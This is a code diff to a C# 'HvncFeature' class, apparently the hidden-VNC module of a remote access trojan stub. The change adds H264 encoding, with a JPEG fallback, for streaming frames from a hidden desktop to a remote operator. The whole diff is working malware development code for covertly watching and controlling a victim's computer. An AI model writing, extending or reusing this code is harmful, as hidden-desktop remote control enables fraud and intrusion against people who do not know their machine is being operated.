@@ -326,6 +326,9 @@ internal static class HvncFeature
     // Modifier key state — tracked by HandleKey, used by VkToChars
     private static bool _shiftDown, _ctrlDown, _altDown, _capsLock;
 
+    // H264 encoder — null when unavailable (falls back to JPEG)
+    private static H264Encoder? _h264Enc;
+
 
     // ── Public API ────────────────────────────────────────────────────────────
 
@@ -361,6 +364,8 @@ internal static class HvncFeature
         StubLog.Info($"[HVNC] Desktop 0x{_hDesktop:X}, canvas {_canvasW}x{_canvasH}");
 
         EnsureGdiplus();
+        // Try H264 encoder — graceful fallback to JPEG if MF unavailable
+        _h264Enc = H264Encoder.Create(_canvasW, _canvasH, cfg.Fps);
         Interlocked.Exchange(ref _pendingAcks, 2);
         _running = true;
         _captureThread = new Thread(CaptureLoop)
@@ -385,6 +390,7 @@ internal static class HvncFeature
 
         if (_hDesktop != 0) { CloseDesktop(_hDesktop); _hDesktop = 0; }
         if (_gdipToken != 0) { GdiplusShutdown(_gdipToken); _gdipToken = 0; }
+        _h264Enc?.Dispose(); _h264Enc = null;
 
         _movingWindow    = false;
         _movingHwnd      = 0;
@@ -538,17 +544,33 @@ internal static class HvncFeature
 
                 try
                 {
-                    var jpeg = CaptureFrame();
-                    if (jpeg != null)
+                    if (_h264Enc != null)
                     {
-                        var frame = new HvncFrameDataStub { W = _canvasW, H = _canvasH, J = Convert.ToBase64String(jpeg) };
-                        _send?.Invoke((int)PacketType.HvncFrame,
-                            JsonSerializer.Serialize(frame, SeroJson.Default.HvncFrameDataStub));
+                        // H264 path: capture composite, encode via MF H264 encoder
+                        if (CaptureComposite() && _compBits != 0)
+                        {
+                            var h264 = _h264Enc.Encode(_compBits, _canvasW * 4);
+                            if (h264 != null)
+                            {
+                                var frame = new H264FrameDataStub { W = _canvasW, H = _canvasH, D = Convert.ToBase64String(h264) };
+                                _send?.Invoke((int)PacketType.HvncH264Frame,
+                                    JsonSerializer.Serialize(frame, SeroJson.Default.H264FrameDataStub));
+                            }
+                            else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
+                        }
+                        else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                     }
                     else
                     {
-                        Interlocked.Increment(ref _pendingAcks);
-                        Thread.Sleep(50);
+                        // JPEG path (fallback)
+                        var jpeg = CaptureFrame();
+                        if (jpeg != null)
+                        {
+                            var frame = new HvncFrameDataStub { W = _canvasW, H = _canvasH, J = Convert.ToBase64String(jpeg) };
+                            _send?.Invoke((int)PacketType.HvncFrame,
+                                JsonSerializer.Serialize(frame, SeroJson.Default.HvncFrameDataStub));
+                        }
+                        else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                     }
                 }
                 catch { Thread.Sleep(33); }
@@ -564,11 +586,12 @@ internal static class HvncFeature
 
     // ── Frame capture DIBSection cache + direct pixel copy ──
 
-    private static unsafe byte[]? CaptureFrame()
+    // Returns true when at least one window was drawn into _compBits (BGRA, stride = _canvasW*4).
+    private static unsafe bool CaptureComposite()
     {
         int w = _canvasW, h = _canvasH;
-        if (_compHdcRef == 0) return null;
-        if (!EnsureComposite(w, h)) return null;
+        if (_compHdcRef == 0) return false;
+        if (!EnsureComposite(w, h)) return false;
 
         // Clear composite to black
         new Span<byte>((void*)_compBits, w * h * 4).Clear();
@@ -632,7 +655,7 @@ internal static class HvncFeature
             drawn++;
         }
 
-        if (drawn == 0) return null;
+        if (drawn == 0) return false;
 
         // Draw a standard arrow cursor at the tracked position.
         // Using LoadCursor(IDC_ARROW) avoids GetCursor()/GetCursorInfo() returning
@@ -641,8 +664,15 @@ internal static class HvncFeature
         if (hArrow != 0 && _curX >= 0 && _curY >= 0 && _curX < w && _curY < h)
             DrawIconEx(_compHdc, _curX, _curY, hArrow, 0, 0, 0, 0, 3 /*DI_NORMAL*/);
 
-        // DIBSection is BGRA; GDI+ PixelFormat32bppBGR (0x26200A) matches
-        return EncodeJpeg(_compBits, w, h, w * 4);
+        return true;
+    }
+
+    // JPEG path — captures composite and encodes to JPEG bytes.
+    private static unsafe byte[]? CaptureFrame()
+    {
+        if (!CaptureComposite()) return null;
+        // DIBSection pixels in _compBits are BGRA (PixelFormat32bppARGB / 0x26200A)
+        return EncodeJpeg(_compBits, _canvasW, _canvasH, _canvasW * 4);
     }
 
     // ── Composite DIBSection ──────────────────────────────────────────────────
